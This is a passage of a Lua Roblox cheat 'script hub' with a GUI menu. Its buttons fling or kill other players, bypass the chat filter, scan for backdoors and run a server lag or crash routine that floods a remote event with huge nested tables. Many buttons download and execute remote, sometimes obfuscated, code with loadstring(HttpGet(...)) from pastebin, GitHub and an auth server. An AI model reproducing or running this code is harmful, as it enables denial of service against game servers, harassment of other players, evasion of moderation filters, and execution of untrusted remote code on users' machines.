				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.4)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(10000, 10000, 10000))
				wait(0.8)
				game:GetService("Players").LocalPlayer.Character:MoveTo(game:GetService("Players")[v.Name].Character.Position)
				wait(0.8)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = NOW
			end
		end)
		Kill.MouseButton1Click:connect(function()
			for i, v in pairs(GetPlayer(EnterUsername.Text)) do
				game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
				local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
				l.Parent = game:GetService("Players").LocalPlayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
				game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
				wait(0.1)
				game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
				game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
				for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
					game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
				end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.4)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(10000, 10000, 10000))
			end
		end)
		superspinning = false
		SuperSpin.MouseButton1Click:connect(function()
			superspinning = not superspinning
			if superspinning then
				SuperSpin.BackgroundColor3 = loc
				for i, v in pairs(GetPlayer(EnterUsername.Text)) do
					game:GetService("Players").LocalPlayer.Character.Humanoid.Name = 1
					local l = game:GetService("Players").LocalPlayer.Character["1"]:Clone()
					l.Parent = game:GetService("Players").LocalPlayer.Character
					l.Name = "Humanoid"
					wait(0.1)
					game:GetService("Players").LocalPlayer.Character["1"]:Destroy()
					game.Workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
					game:GetService("Players").LocalPlayer.Character.Animate.Disabled = true
					wait(0.1)
					game:GetService("Players").LocalPlayer.Character.Animate.Disabled = false
					game:GetService("Players").LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
					for i, v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren()) do
						game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(v)
					end
					game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
					wait(1)
					while wait() do
						if superspinning then
							game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
						end
					end
				end
			else
				SuperSpin.BackgroundColor3 = col
			end
		end)
	end
})
GUIS:AddButton({
	Title = "FE Fling GUI",
	Description = "FE Fling GUI",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
--This link auto updates, so there's no need to update this file.
	end
})
local Main = Window:AddTab({
	Title = "Main",
	Icon = "globe"
})
Main:AddButton({
	Title = "Close",
	Description = "Closes UI if X or close button isnt working",
	Callback = function()
		for i,v in pairs(game:GetService("CoreGui"):GetDescendants()) do
			if v.Name == "ScreenGui" then
				for i,v in pairs(v:GetDescendants()) do
					if v.Name == "Frame" then
						v.Parent:Destroy()
					end
				end
			end
		end
	end
})
Main:AddButton({
	Title = "FE Universal Script Hub",
	Description = "FE Universal Script Hub",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/Dvrknvss/e2a906135f9e55d0d2ae7aaf337d8937/raw/dc055592803f8418ddf8ba7b84286f47638849d4/noidea'))()
	end
})
Main:AddButton({
	Title = "Portal Gun",
	Description = "COOL ASF",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/portal%20gun.txt'))()
	end
})
Main:AddButton({
	Title = "FE Server lag or crash",
	Description = "idk how well this works and only for sum games",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
	end
})
Main:AddButton({
	Title = "FE Server lag or crash 2",
	Description = "idk how well this works",
	Callback = function()
		shared.TeleportToSky = false -- for games that show ur ping (like custom duels)
		if shared.TeleportToSky then
			local char = game:GetService('Players').LocalPlayer.Character
			char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable / (val + 2))
				return calculateperfectval
			end
			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}
				table.insert(spammedtable, {})
				z = spammedtable[1]
				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end
				local calculatemax = getmaxvalue(tableincrease)
				local maximum
				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end
				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end
				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end
			bomb(289, 5) --// change values if client crashes
		end
	end
})
Main:AddButton({
	Title = "FE Server lag or crash 3",
	Description = "This script is designed for skill-based games such as Hood Customs and More",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/yGqP4zFa"))()
	end
})
Main:AddButton({
	Title = "Small server Joiner",
	Description = "joins smallest server",
	Callback = function()
		local Http = game:GetService("HttpService")
		local TPS = game:GetService("TeleportService")
		local Api = "https://games.roblox.com/v1/games/"
		local _place = game.PlaceId
		local _servers = Api .. _place .. "/servers/Public?sortOrder=Asc&limit=100"
		function ListServers(cursor)
			local Raw = game:HttpGet(_servers .. ((cursor and "&cursor=" .. cursor) or ""))
			return Http:JSONDecode(Raw)
		end
		local Server, Next;
		repeat
			local Servers = ListServers(Next)
			Server = Servers.data[1]
			Next = Servers.nextPageCursor
		until Server
		TPS:TeleportToPlaceInstance(_place, Server.id, game:GetService("Players").LocalPlayer)
	end
})
Main:AddButton({
	Title = "Server browser",
	Description = "Browse Servers of current Place",
	Callback = function()
		loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
	end
})
Main:AddButton({
	Title = "Eclipse hub/Sniper to join",
	Description = "Join Person",
	Callback = function()
		getgenv().mainKey = "nil"
		local a, b, c, d, e = loadstring, request or http_request or (http and http.request) or (syn and syn.request), assert, tostring, "https://api.eclipsehub.xyz/auth"
		c(a and b, "Executor not Supported")
		a(b({
			Url = e .. "\?\107e\121\61" .. d(mainKey),
			Headers = {
				["User-Agent"] = "Eclipse"
			}
		}).Body)()
	end
})
GUIS:AddButton({
	Title = "System Broken FE",
	Description = "Animations",
	Callback = function()
		local credits = "SystemBroken made by system_calix"
		loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
	end
})
Main:AddButton({
	Title = "FE Car Tornado",
	Description = "spins car when found or sum idrk",
	Callback = function()
			-- Scripted on mobile
-- Fe Vehicle Fling Alpha

-- Start UP
		local notification = Instance.new("Sound")
		notification.Parent = game:GetService("SoundService")
		notification.SoundId = "rbxassetid://9086208751"
		notification.Volume = 1
		local char = game:GetService("Players").LocalPlayer.Character
		function getRoot(char)
			local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
			return rootPart
		end

-- Part Detector Seat
		local SPart = Instance.new("Part");
		local Player = game:GetService('Players').LocalPlayer;
		repeat
			game:GetService('RunService').RenderStepped:Wait()
		until Player.Character;
		local Character = Player.Character;
		SPart.Anchored, SPart.CanCollide = true, true;
		SPart.Parent = workspace;
		SPart.Size = Vector3.new(1, 100, 1)
		SPart.Transparency = 0.4
		game:GetService('RunService').Stepped:Connect(function()
			local Ray = Ray.new(Character.PrimaryPart.Position + Character.PrimaryPart.CFrame.LookVector * 6, Vector3.new(0, -1, 0) * 4);
			local FPOR = workspace:FindPartOnRayWithIgnoreList(Ray, {
				Character
			});
			if (FPOR) then
				SPart.CFrame = Character.PrimaryPart.CFrame + Character.PrimaryPart.CFrame.LookVector * 6;
			end
			if SPart == nil then
				Ray:destroy()
				FPOR:destroy()
			end
		end)
		game.StarterGui:SetCore("SendNotification", {
			Title = "FE Vehicle Fling";
			Icon = "rbxassetid://7279804519";
			Text = "Identify Passanger Seat, Part_OnTouched";
			Duration = 10;
			notification:Play()
		})

-- The finish touches
-- Mobile and PC Support BODYGYRO
		SPart.Touched:Connect(function(hit)
			if hit:IsA("Seat") then
				local IsFlying = False
				local flyv
				local flyg
				local Player = game:GetService("Players").LocalPlayer
				local Speed = 50
				local LastSpeed = Speed
				local maxspeed = 100
				local IsRunning = false
				local f = 0
				IsFlying = true
				flyv = Instance.new("BodyVelocity")
				flyv.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
				flyv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				flyg = Instance.new("BodyGyro")
				flyg.Parent = Player.Character:FindFirstChild('Torso') or Player.Character:FindFirstChild('UpperTorso')
				flyg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
				flyg.P = 1000
				flyg.D = 50
				Player.Character:WaitForChild('Humanoid').PlatformStand = true
				Player.Character.Humanoid.Changed:Connect(function(Prop)
					if Player.Character.Humanoid.MoveDirection == Vector3.new(0, 0, 0) then
						IsRunning = false
					else
						IsRunning = true
					end
				end)
				spawn(function()
					while true do
						wait()
						if IsFlying then
							flyg.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((f + 0) * 50 * Speed / maxspeed), 0, 0)
							flyv.Velocity = workspace.CurrentCamera.CoordinateFrame.LookVector * Speed
							wait(0.1)
							if Speed < 0 then
								Speed = 0
								f = 0
							end
						end
						if IsRunning then
							Speed = LastSpeed
						else
							if not Speed == 0 then
								LastSpeed = Speed
							end
							Speed = 0
						end
					end
				end)
				Speed = 0.1
				wait(0.3)
				hit:Sit(game:GetService("Players").LocalPlayer.Character.Humanoid)
				SPart:Destroy()
				wait(0.3)
				local speaker = game:GetService("Players").LocalPlayer
				local seat = speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart
				local vehicleModel = seat.Parent
				repeat
					if vehicleModel.ClassName ~= "Model" then
						vehicleModel = vehicleModel.Parent
					end
				until vehicleModel.ClassName == "Model"
				wait(0.1)
				for i, v in pairs(vehicleModel:GetDescendants()) do
					if v:IsA("BasePart") and v.CanCollide then
						v.CanCollide = false
					end
				end
				wait(0.2)
				Speed = 80
				local Spin = Instance.new("BodyAngularVelocity")
				Spin.Name = "Spinning"
				Spin.Parent = getRoot(speaker.Character)
				Spin.MaxTorque = Vector3.new(0, math.huge, 0)
				Spin.AngularVelocity = Vector3.new(0, 2000, 0)
				game.StarterGui:SetCore("SendNotification", {
					Title = "FE Vehicle Fling";
					Icon = "rbxassetid://7279804519";
					Text = "Identified the seat part, Success!";
					Duration = 10;
					notification:Play()
				})
			end
		end)
	end
})
Main:AddButton({
	Title = "Walk on Walls FE",
	Description = "kinda buggy if execute more than once",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Walk%20On%20Walls%20Script%20(R6%2615).txt"))()
	end
})
Main:AddButton({
	Title = "Netless V2",
	Description = "need to do every time u reset",
	Callback = function()
		for i, v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
			if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
				game:GetService("RunService").Heartbeat:connect(function()
					v.Velocity = Vector3.new(0, 35, 0)
					wait(0.5)
				end)
			end
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Notification";
			Text = "Netless activated";
			Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"
		})
		Duration = 16;
	end
})
Main:AddButton({
	Title = "FE Hat Ferris Wheel",
	Description = "Hats spin around your character in a circle motion must wear like 5 hats or more on avatar",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_8u7A6D92KJWJXgB4btM3lJNPDy2mCi61S191KbGF2EfX9621qbXQg0tBivwEi0Kr.lua.txt'), true))()
	end
})
GUIS:AddButton({
	Title = "Sushi X",
	Description = "idk",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/sushi/main/X'), true))()
	end
})
Main:AddButton({
	Title = "FE Chat Bypass",
	Description = "Bypasses Chat Filter",
	Callback = function()
		loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
	end
})
Main:AddButton({
	Title = "FE Chat Bypass 2",
	Description = "Bypasses Chat Filter",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua", true))()
	end
})
Main:AddButton({
	Title = "FE Chat Bypass 3",
	Description = "Bypasses Chat Filter",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainGotStucked/a55af82d82574/main/Eminence%20Hub"))()
	end
})
Main:AddButton({
	Title = "FE Chat Bypass 4",
	Description = "Bypasses Chat Filter",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/wspo23e/SDL-Roblox-ChatBypasser/main/SDL-NoFilterV2.5"))()
	end
})
Main:AddButton({
	Title = "Backdoor.exe",
	Description = "Scans for backdoors",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
	end
})
Main:AddButton({
	Title = "Backdoor.exe V6",
	Description = "Scans for backdoors",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6/source.lua"))()
	end
})
Main:AddButton({
	Title = "Backdoor.exe V6x",
	Description = "Scans for backdoors",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
	end
})
Main:AddButton({
	Title = "Backdoor.exe V8",
	Description = "Scans for backdoors",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
	end
})
Main:AddButton({
	Title = "Blackhole",
	Description = "unanchored objects",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/qRvKHjVN"))();
	end
})
Main:AddButton({
	Title = "FE Backflip",
	Description = "Keybinds are Z X C",
	Callback = function()
		wait(5)--
		local ver = "2.00"
		local scriptname = "feFlip"--
		local FrontflipKey = Enum.KeyCode.Z
		local BackflipKey = Enum.KeyCode.X
		local AirjumpKey = Enum.KeyCode.C--
		local ca = game:GetService("ContextActionService")
		local zeezy = game:GetService("Players").LocalPlayer
		local h = 0.0174533
		local antigrav--
		function zeezyFrontflip(act, inp, obj)
			if inp == Enum.UserInputState.Begin then
				zeezy.Character.Humanoid:ChangeState("Jumping")
				wait()
				zeezy.Character.Humanoid.Sit = true
				for i = 1, 360 do
					delay(i / 720, function()
						zeezy.Character.Humanoid.Sit = true
						zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h, 0, 0)
					end)
				end
				wait(0.55)
				zeezy.Character.Humanoid.Sit = false
			end
		end
		function zeezyBackflip(act, inp, obj)
			if inp == Enum.UserInputState.Begin then
				zeezy.Character.Humanoid:ChangeState("Jumping")
				wait()
				zeezy.Character.Humanoid.Sit = true
				for i = 1, 360 do
					delay(i / 720, function()
						zeezy.Character.Humanoid.Sit = true
						zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h, 0, 0)
					end)
				end
				wait(0.55)
				zeezy.Character.Humanoid.Sit = false
			end
		end
		function zeezyAirjump(act, inp, obj)
			if inp == Enum.UserInputState.Begin then
				zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
				wait()
				zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
			end
		end--
		ca:BindAction("zeezyFrontflip", zeezyFrontflip, false, FrontflipKey)
		ca:BindAction("zeezyBackflip", zeezyBackflip, false, BackflipKey)
		ca:BindAction("zeezyAirjump", zeezyAirjump, false, AirjumpKey)--
		print(scriptname .. " " .. ver .. " loaded successfully")
		print("made by Zeezy#7203")
		local notifSound = Instance.new("Sound", workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {
			Title = "feFlip",
			Text = "feFlip loaded successfully!",
			Icon = "rbxassetid://505845268",
			Duration = 5,
			Button1 = "Okay"
		})
	end
})
Main:AddButton({
	Title = "Super fling",
	Description = "fling players",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/superfling', true))()
	end
})
Main:AddButton({
	Title = "FE Noob All Auto Rap Battles",
	Description = "by jxyserr",
	Callback = function()
		loadstring(game:HttpGet('https://pastes.io/raw/1priqwpcnv'))();
	end
})
Main:AddButton({
	Title = "FE Big Head Rthro R15",
	Description = "dont use hats/hair also scale head to max in avatar",
	Callback = function()
			 --  ((Packed with care by sysGhost/BiKode))
--  Remember to use R15 with Rthro avatar(head) and scale ur head at max
		for i, v in pairs(game:GetService("Players").LocalPlayer.Character.Humanoid:GetChildren()) do
			if string.find(v.Name, "Scale") and v.Name ~= "HeadScale" then
				repeat
					wait(HeadGrowSpeed)
				until game:GetService("Players").LocalPlayer.Character.Head:FindFirstChild("OriginalSize")
				game:GetService("Players").LocalPlayer.Character.Head.OriginalSize:Destroy()
				v:Destroy()
				game:GetService("Players").LocalPlayer.Character.Head:WaitForChild("OriginalSize")
			end
		end
	end
})
Main:AddButton({
	Title = "FE upside down R6",
	Description = "cant see on ur side but everyone else can",
	Callback = function()
		local lp = game:GetService("Players").LocalPlayer
		local c = lp.Character
		local hrp0 = c:FindFirstChild("HumanoidRootPart")
		local hrp1 = hrp0:Clone()
		c.Parent = nil
		hrp0.Parent = hrp1
		hrp0.RootJoint.Part0 = nil
		hrp1.Parent = c
		c.Parent = workspace
		local h = game:GetService("RunService").Heartbeat
		hrp0.Transparency = 0.5
		while h:Wait() and c and c.Parent do
			hrp0.CFrame = hrp1.CFrame
			hrp0.Orientation += Vector3.new(0, 0, 180)
			hrp0.Position -= Vector3.new(0, 1, 0)
			hrp0.Velocity = hrp1.Velocity
		end
	end
})
Main:AddButton({
	Title = "Fling Click on person you want",
	Description = "makes ur character a kinda shaky on other ppls screens",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
	end
})
Main:AddButton({
	Title = "FE Teleknis script v2 only works on unachorned parts",
	Description = "use while moving Q E R T Y",
	Callback = function()
			-- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
		local function a(b, c)
			local d = getfenv(c)
			local e =
        setmetatable(
        {},
        {
				__index = function(self, f)
					if f == "script" then
						return b
					else
						return d[f]
					end
				end
			}
    )
			setfenv(c, e)
			return c
		end
		local g = {}
		local h = Instance.new("Model", game:GetService("Lighting"))
		local i = Instance.new("Tool")
		local j = Instance.new("Part")
		local k = Instance.new("Script")
		local l = Instance.new("LocalScript")
		local m = sethiddenproperty or set_hidden_property
		i.Name = "Telekinesis"
		i.Parent = h
		i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
		i.GripForward = Vector3.new(-0, -1, -0)
		i.GripRight = Vector3.new(0, 0, 1)
		i.GripUp = Vector3.new(1, 0, 0)
		j.Name = "Handle"
		j.Parent = i
		j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
		j.Orientation = Vector3.new(0, 180, 90)
		j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
		j.Rotation = Vector3.new(-180, 0, -90)
		j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
		j.Transparency = 1
		j.Size = Vector3.new(1, 1.20000005, 1)
		j.BottomSurface = Enum.SurfaceType.Weld
		j.BrickColor = BrickColor.new("Really black")
		j.Material = Enum.Material.Metal
		j.TopSurface = Enum.SurfaceType.Smooth
		j.brickColor = BrickColor.new("Really black")
		k.Name = "LineConnect"
		k.Parent = i
		table.insert(
    g,
    a(
        k,
        function()
			wait()
			local n = script.Part2
			local o = script.Part1.Value
			local p = script.Part2.Value
			local q = script.Par.Value
			local color = script.Color
			local r = Instance.new("Part")
			r.TopSurface = 0
			r.BottomSurface = 0
			r.Reflectance = .5
			r.Name = "Laser"
			r.Locked = true
			r.CanCollide = false
			r.Anchored = true
			r.formFactor = 0
			r.Size = Vector3.new(1, 1, 1)
			local s = Instance.new("BlockMesh")
			s.Parent = r
			while true do
				if n.Value == nil then
					break
				end
				if o == nil or p == nil or q == nil then
					break
				end
				if o.Parent == nil or p.Parent == nil then
					break
				end
				if q.Parent == nil then
					break
				end
				local t = CFrame.new(o.Position, p.Position)
				local dist = (o.Position - p.Position).magnitude
				r.Parent = q
				r.BrickColor = color.Value.BrickColor
				r.Reflectance = color.Value.Reflectance
				r.Transparency = color.Value.Transparency
				r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
				r.CFrame = CFrame.new(r.Position, p.Position)
				s.Scale = Vector3.new(.25, .25, dist)
				wait()
			end
			r:remove()
			script:remove()
		end
    )
)
		k.Disabled = true
		l.Name = "MainScript"
		l.Parent = i
		table.insert(
    g,
    a(
        l,
        function()
			wait()
			tool = script.Parent
			lineconnect = tool.LineConnect
			object = nil
			mousedown = false
			found = false
			BP = Instance.new("BodyPosition")
			BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
			BP.P = BP.P * 1.1
			dist = nil
			point = Instance.new("Part")
			point.Locked = true
			point.Anchored = true
			point.formFactor = 0
			point.Shape = 0
			point.BrickColor = BrickColor.Black()
			point.Size = Vector3.new(1, 1, 1)
			point.CanCollide = false
			local s = Instance.new("SpecialMesh")
			s.MeshType = "Sphere"
			s.Scale = Vector3.new(.7, .7, .7)
			s.Parent = point
			handle = tool.Handle
			front = tool.Handle
			color = tool.Handle
			objval = nil
			local u = false
			local v = BP:clone()
			v.maxForce = Vector3.new(30000, 30000, 30000)
			function LineConnect(o, p, q)
				local w = Instance.new("ObjectValue")
				w.Value = o
				w.Name = "Part1"
				local x = Instance.new("ObjectValue")
				x.Value = p
				x.Name = "Part2"
				local y = Instance.new("ObjectValue")
				y.Value = q
				y.Name = "Par"
				local z = Instance.new("ObjectValue")
				z.Value = color
				z.Name = "Color"
				local A = lineconnect:clone()
				A.Disabled = false
				w.Parent = A
				x.Parent = A
				y.Parent = A
				z.Parent = A
				A.Parent = workspace
				if p == object then
					objval = x
				end
			end
			function onButton1Down(B)
				if mousedown == true then
					return
				end
				mousedown = true
				coroutine.resume(
                    coroutine.create(
                        function()
					local C = point:clone()
					C.Parent = tool
					LineConnect(front, C, workspace)
					while mousedown == true do
						C.Parent = tool
						if object == nil then
							if B.Target == nil then
								local t = CFrame.new(front.Position, B.Hit.p)
								C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
							else
								C.CFrame = CFrame.new(B.Hit.p)
							end
						else
							LineConnect(front, object, workspace)
							break
						end
						wait()
					end
					C:remove()
				end
                    )
                )
				while mousedown == true do
					if B.Target ~= nil then
						local D = B.Target
						if D.Anchored == false then
							object = D
							dist = (object.Position - front.Position).magnitude
							break
						end
					end
					wait()
				end
				while mousedown == true do
					if object.Parent == nil then
						break
					end
					local t = CFrame.new(front.Position, B.Hit.p)
					BP.Parent = object
					BP.position = front.Position + t.lookVector * dist
					wait()
				end
				BP:remove()
				object = nil
				objval.Value = nil
			end
			function onKeyDown(E, B)
				local E = E:lower()
				local F = false
				if E == "q" then
					if dist >= 5 then
						dist = dist - 10
					end
				end
				if E == "r" then
					if object == nil then
						return
					end
					for G, H in pairs(object:children()) do
						if H.className == "BodyGyro" then
							return nil
						end
					end
					BG = Instance.new("BodyGyro")
					BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
					BG.cframe = CFrame.new(object.CFrame.p)
					BG.Parent = object
					repeat
						wait()
					until object.CFrame == CFrame.new(object.CFrame.p)
					BG.Parent = nil
					if object == nil then
						return
					end
					for G, H in pairs(object:children()) do
						if H.className == "BodyGyro" then
							H.Parent = nil
						end
					end
					object.Velocity = Vector3.new(0, 0, 0)
					object.RotVelocity = Vector3.new(0, 0, 0)
					object.Orientation = Vector3.new(0, 0, 0)
				end
				if E == "e" then
					dist = dist + 10
				end
				if E == "t" then
					if dist ~= 10 then
						dist = 10
					end
				end
				if E == "y" then
					if dist ~= 200 then
						dist = 200
					end
				end
				if E == "=" then
					BP.P = BP.P * 1.5
				end
				if E == "-" then
					BP.P = BP.P * 0.5
				end
			end
			function onEquipped(B)
				keymouse = B
				local I = tool.Parent
				human = I.Humanoid
				human.Changed:connect(
                    function()
					if human.Health == 0 then
						mousedown = false
						BP:remove()
						point:remove()
						tool:remove()
					end
				end
                )
				B.Button1Down:connect(
                    function()
					onButton1Down(B)
				end
                )
				B.Button1Up:connect(
                    function()
					mousedown = false
				end
                )
				B.KeyDown:connect(
                    function(E)
					onKeyDown(E, B)
				end
                )
				B.Icon = "rbxasset://textures\\GunCursor.png"
			end
			tool.Equipped:connect(onEquipped)
		end
    )
)
		for J, H in pairs(h:GetChildren()) do
			H.Parent = game:GetService("Players").LocalPlayer.Backpack
			pcall(
        function()
				H:MakeJoints()
			end
    )
		end
		h:Destroy()
		for J, H in pairs(g) do
			spawn(
        function()
				pcall(H)
			end
    )
		end
	end
})
GUIS:AddButton({
	Title = "Nullware Hub V3",
	Description = "Reanimations",
	Callback = function()
		local LocalPlayer = game:GetService("Players").LocalPlayer
		local Heartbeat = game:GetService("RunService").Heartbeat
		Heartbeat:Connect(function()
			LocalPlayer.MaximumSimulationRadius = math.huge
			sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
		end)
-- Script above is a fix to limbs falling --

-- Nullware Hub V3 | --
		getgenv().Theme = "Purple" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
		loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=" .. (function()
			local a = ""
			for b = 1, 256 do
				local c = math.random(1, 3)
				a = a .. string.char(c == 1 and math.random(48, 57) or c == 2 and math.random(97, 122) or c == 3 and math.random(65, 90))
			end;
			return a
		end)()))()
	end
})
InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("Trollolo")
local Settings = Window:AddTab({
	Title = "Settings",
	Icon = "settings"
})
InterfaceManager:BuildInterfaceSection(Settings)
SaveManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({
	'TextboxIdentifier'
})
SaveManager:SetFolder("Trollolo/Configs")
local Config = Window:AddTab({
	Title = "Config",
	Icon = "settings"
})
SaveManager:BuildConfigSection(Config)
SaveManager:LoadAutoloadConfig()
Window:SelectTab(1)
